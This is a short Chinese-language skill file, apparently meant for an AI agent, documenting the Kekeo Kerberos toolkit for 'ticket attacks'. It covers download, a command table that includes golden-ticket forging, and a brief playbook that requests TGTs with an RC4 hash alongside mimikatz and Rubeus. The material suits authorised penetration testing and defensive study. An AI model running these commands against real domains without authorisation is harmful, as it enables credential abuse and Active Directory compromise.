---
name: kekeo-kerberos
description: Kekeo: Kerberos 票据攻防。信号:kerberos,票据攻击,交互,请求 TGT,请求服务票。
---

# Kekeo

- 攻击大类:C26 Kerberos与票据攻击
- 上游仓库:https://github.com/gentilkiwi/kekeo
- 上游 License:CC BY 4.0(署名)(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
release 下载 kekeo.exe
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `kekeo.exe` | 交互 |
| `tgt::ask /user:x /domain:corp.local /password:y` | 请求 TGT |
| `tgs::request` | 请求服务票 |
| `tgt::golden` | 黄金票据 |
| `misc::convert ccache ticket.kirbi` | 格式转换 |

## 攻击场景 Playbook

### Kerberos 票据攻防

```bash
kekeo # tgt::ask /user:svc /domain:corp.local /rc4:hash
kekeo # tgs::request ...  # 与 mimikatz/Rubeus 票据互通
```

## 注意事项

gentilkiwi 出品的 Kerberos 工具箱;票据格式与 mimikatz 互通,适合跨工具链。
